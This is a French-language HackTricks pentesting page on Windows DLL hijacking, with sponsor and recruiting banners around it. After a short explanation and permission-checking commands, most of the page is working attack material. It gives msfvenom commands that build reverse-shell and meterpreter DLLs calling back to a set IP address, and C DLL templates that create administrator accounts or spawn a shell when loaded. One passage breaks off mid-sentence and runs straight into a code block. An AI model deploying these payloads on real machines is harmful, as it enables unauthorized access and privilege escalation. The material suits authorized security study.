# Dll Hijacking

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="original">

Si vous êtes intéressé par une **carrière en piratage** et que vous voulez pirater l'impossible - **nous recrutons !** (_maîtrise du polonais écrit et parlé requis_).

{% embed url="https://www.stmcyber.com/careers" %}

## Définition

Tout d'abord, définissons le terme. Le détournement de DLL consiste, dans le sens le plus large, à **tromper une application légitime/fiable pour qu'elle charge une DLL arbitraire**. Les termes tels que _DLL Search Order Hijacking_, _DLL Load Order Hijacking_, _DLL Spoofing_, _DLL Injection_ et _DLL Side-Loading_ sont souvent - à tort - utilisés pour dire la même chose.

Le détournement de DLL peut être utilisé pour **exécuter** du code, obtenir une **persistance** et **escalader les privilèges**. Parmi ces 3 options, la **moins probable** à trouver est l'**escalade de privilèges** de loin. Cependant, comme cela fait partie de la section d'escalade de privilèges, je me concentrerai sur cette option. Notez également que, indépendamment de l'objectif, un détournement de DLL est effectué de la même manière.

### Types

Il existe une **variété d'approches** à choisir, le succès dépendant de la façon dont l'application est configurée pour charger ses DLL requises. Les approches possibles comprennent :

1. **Remplacement de DLL** : remplacer une DLL légitime par une DLL malveillante. Cela peut être combiné avec le _DLL Proxying_ \[[2](https://kevinalmansa.github.io/application%20security/DLL-Proxying/)], qui garantit que toutes les fonctionnalités de la DLL d'origine restent intactes.
2. **Hijacking de l'ordre de recherche de DLL** : les DLL spécifiées par une application sans chemin sont recherchées dans des emplacements fixes dans un ordre spécifique \[[3](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)]. Le détournement de l'ordre de recherche se produit en plaçant la DLL malveillante dans un emplacement qui est recherché avant la DLL réelle. Cela inclut parfois le répertoire de travail de l'application cible.
3. **Hijacking de DLL fantôme** : déposez une DLL malveillante à la place d'une DLL manquante/inexistante que tente de charger une application légitime \[[4](http://www.hexacorn.com/blog/2013/12/08/beyond-good-ol-run-key-part-5/)].
4. **Redirection de DLL** : changer l'emplacement dans lequel la DLL est recherchée, par exemple en modifiant la variable d'environnement `%PATH%`, ou les fichiers `.exe.manifest` / `.exe.local` pour
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Et **vérifiez les permissions de tous les dossiers à l'intérieur de PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Vous pouvez également vérifier les imports d'un exécutable et les exports d'une dll avec:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Pour un guide complet sur la façon d'**utiliser le détournement de DLL pour escalader les privilèges** avec des autorisations d'écriture dans un dossier **System Path**, consultez :

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### Outils automatisés

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) vérifiera si vous avez des autorisations d'écriture sur un dossier à l'intérieur du chemin système.\
D'autres outils automatisés intéressants pour découvrir cette vulnérabilité sont les fonctions de **PowerSploit** : _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ et _Write-HijackDll._

### Exemple

Dans le cas où vous trouvez un scénario exploitable, l'une des choses les plus importantes pour l'exploiter avec succès serait de **créer une DLL qui exporte au moins toutes les fonctions que l'exécutable importera d'elle**. Quoi qu'il en soit, notez que le détournement de DLL est pratique pour [passer du niveau d'intégrité moyen à élevé **(en contournant UAC)**](../authentication-credentials-uac-and-efs.md#uac) ou de [**l'intégrité élevée à SYSTEME**](./#from-high-integrity-to-system)**.** Vous pouvez trouver un exemple de **comment créer une DLL valide** dans cette étude de détournement de DLL axée sur le détournement de DLL pour l'exécution : [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
De plus, dans la **section suivante**, vous pouvez trouver quelques **codes DLL de base** qui pourraient être utiles en tant que **modèles** ou pour créer une **DLL avec des fonctions non requises exportées**.

## **Création et compilation de DLL**

### **Proxy DLL**

Fondamentalement, un **proxy DLL** est une DLL capable d'**exécuter votre code malveillant lorsqu'elle est chargée**, mais aussi de **s'exposer** et de **fonctionner** comme **attendu** en **relayant tous les appels à la bibliothèque réelle**.

Avec l'outil **** [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) **** ou **** [**Spartacus**](https://github.com/Accenture/Spartacus) ****, vous pouvez en fait **indiquer un exécutable et sélectionner la bibliothèque** que vous voulez proxifier et **générer une DLL proxifiée** ou **indiquer la DLL** et **générer une DLL proxifiée**.

### **Meterpreter**

**Obtenir une shell inversée (x64) :**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Obtenir un meterpreter (x86) :**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Créer un utilisateur (je n'ai pas vu de version x64) :**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Le vôtre

Notez que dans plusieurs cas, la DLL que vous compilez doit **exporter plusieurs fonctions** qui vont être chargées par le processus victime. Si ces fonctions n'existent pas, le **binaire ne pourra pas les charger** et l'**exploit échouera**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```
<img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="original">

Si vous êtes intéressé par une **carrière en piratage** et souhaitez pirater l'impossible - **nous recrutons !** (_maîtrise du polonais à l'écrit et à l'oral requise_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
